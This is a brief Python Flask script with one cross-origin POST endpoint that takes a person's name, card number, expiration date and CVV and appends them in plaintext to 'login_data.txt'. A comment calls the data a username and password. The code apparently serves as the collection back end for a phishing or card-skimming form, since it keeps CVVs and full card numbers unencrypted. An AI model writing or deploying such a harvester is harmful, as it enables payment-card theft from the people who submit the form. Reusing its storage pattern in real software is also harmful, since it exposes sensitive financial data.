from flask import Flask, request, jsonify
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)


# Define the path to the file where the data will be saved
data_file = "login_data.txt"




@app.route('/submit', methods=['POST'])
def submit_data():
   # Get the data from the request
   data = request.get_json()


   name = data.get('Name')
   cardNumber = data.get('CardNumber')
   expirationDate = data.get('ExpirationDate')
   cvv = data.get('CVV')

   if name and cardNumber:
       # Open the file in append mode and save the username and password
       with open(data_file, 'a') as file:
           file.write(f"Name: {name}, CardNumber: {cardNumber}, Expiration Date: {expirationDate}, CVV: {cvv}\n")


       return jsonify({"message": "Data saved successfully"}), 200
   else:
       return jsonify({"message": "Invalid data"}), 400




if __name__ == '__main__':
   # Ensure the file exists or create it if necessary
   if not os.path.exists(data_file):
       with open(data_file, 'w') as f:
           pass  # Just create the file if it doesn't exist
   app.run(debug=True, port=8000)